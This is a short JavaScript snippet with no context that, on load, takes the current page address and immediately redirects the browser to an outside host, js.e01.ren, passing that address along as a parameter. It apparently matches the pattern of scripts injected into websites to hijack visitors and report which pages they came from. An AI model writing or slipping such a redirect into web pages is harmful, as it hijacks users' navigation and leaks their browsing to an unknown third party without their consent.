(function(){
	var url = encodeURIComponent(location.href);
	var baseUrl = "http://js.e01.ren?r=edbug/index/client";
	var clientTag = "&clientUrl=";
	location.href = baseUrl + clientTag + url;
})()